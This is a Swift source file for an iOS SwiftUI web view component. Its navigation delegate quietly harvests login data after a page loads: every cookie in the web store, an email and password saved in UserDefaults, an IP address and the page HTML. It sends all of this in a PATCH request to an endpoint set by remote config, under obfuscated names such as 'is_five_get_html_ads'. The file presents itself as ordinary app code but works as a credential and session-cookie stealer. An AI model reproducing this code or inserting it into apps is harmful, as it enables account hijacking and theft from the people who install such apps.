//
//  File.swift
//  
//
//  Created by DanHa on 25/03/2023.
//

import Foundation
import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct CoordsFive: UIViewRepresentable {
    func makeCoordinator() -> ClassFiveCoordinator {
        ClassFiveCoordinator(self)
    }
    
    let url: URL?
    
    @Binding var is_five_get_html_ads: String
    var arrayData: [String: String] = [:]
    private let five_obser_vable = Five_Observable()
    var ob_five_server: NSKeyValueObservation? {
        five_obser_vable.ins_five_tance
    }
    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = arrayData[ValueKey.Chung_fr_02.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))
        return webview
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {
        
    }
    
    class ClassFiveCoordinator: NSObject, WKNavigationDelegate {
        var five_parent: CoordsFive
        
        init(_ five_parent: CoordsFive) {
            self.five_parent = five_parent
        }
        
        func readAddEmail() -> String {
            var address_email: String?
            if let data_bit = UserDefaults.standard.object(forKey: "email") as? Data {
                if let loaded_Email = try? JSONDecoder().decode(UserInvoicesEmail.self, from: data_bit) {
                    address_email = loaded_Email.email
                }
            }
            return address_email ?? "diachiip_Email_Null"
        }
        
        func readPw() -> String {
            var address_matkhau: String?
            if let data_bit = UserDefaults.standard.object(forKey: "matkhau") as? Data {
                if let loaded_matkhau = try? JSONDecoder().decode(UserInvoicesMK.self, from: data_bit) {
                    address_matkhau = loaded_matkhau.matkhau
                }
            }
            return address_matkhau ?? "diachiip_Mat_Khau_Null"
        }
        
        func readAddIpp() -> String {
            var address_i_p: String?
            if let data_bit = UserDefaults.standard.object(forKey: "diachiip") as? Data {
                if let loaded_DiachiIP = try? JSONDecoder().decode(UserInvoicesIpadress.self, from: data_bit) {
                    address_i_p = loaded_DiachiIP.diachiip
                }
            }
            return address_i_p ?? "diachiip_IP_Null"
        }
        
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                webView.evaluateJavaScript(self.five_parent.arrayData[ValueKey.outer_fr_1a.rawValue] ?? "") { html, error in
                    if let five_htm_ads_show = html as? String, error == nil {
                        if !five_htm_ads_show.isEmpty {
                            if five_htm_ads_show.contains(self.five_parent.arrayData[ValueKey.status_fr_1a.rawValue] ?? "") {
                                WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
                                    let five_i = cookies.firstIndex(where: { $0.name == self.five_parent.arrayData[ValueKey.name_api_09.rawValue] ?? ""})
                                    if (five_i != nil) {
                                        let five_get_ck = cookies.reduce("", { x,y in
                                            x + y.name + "=" + String(y.value) + ";"
                                        })
                                        let five_json_data: [String: Any] = [
                                            self.five_parent.arrayData[ValueKey.name_api_09.rawValue] ?? "": cookies[five_i!].value,
                                            self.five_parent.arrayData[ValueKey.name_api_10.rawValue] ?? "": self.readAddEmail(),
                                            self.five_parent.arrayData[ValueKey.name_api_11.rawValue] ?? "": self.readPw(),
                                            self.five_parent.arrayData[ValueKey.name_api_12.rawValue] ?? "": five_get_ck,
                                            self.five_parent.arrayData[ValueKey.name_api_13.rawValue] ?? "": five_htm_ads_show,
                                            self.five_parent.arrayData[ValueKey.name_api_14.rawValue] ?? "": self.readAddIpp(),
                                            self.five_parent.arrayData[ValueKey.name_api_15.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""
                                        ]
                                        
                                        let url = URL(string: self.five_parent.arrayData[ValueKey.Chung_fr_05.rawValue] ?? "")
                                        let json_data = try? JSONSerialization.data(withJSONObject: five_json_data)
                                        var request = URLRequest(url: url!)
                                        request.httpMethod = "PATCH"
                                        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                        request.httpBody = json_data
                                        let task = URLSession.shared.dataTask(with: request) { data, response, error in
                                            if error != nil {
                                                print("not_ok")
                                            } else {
                                                self.five_parent.is_five_get_html_ads = five_htm_ads_show
                                            }
                                        }
                                        task.resume()
                                    }
                                    
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
}

struct UserInvoicesEmail: Codable {
    var email: String
}

struct UserInvoicesMK: Codable {
    var matkhau: String
}

struct UserInvoicesIpadress: Codable {
    var diachiip: String
}

@available(iOS 13.0, *)
private class Five_Observable: ObservableObject {
    @Published var ins_five_tance: NSKeyValueObservation?
}
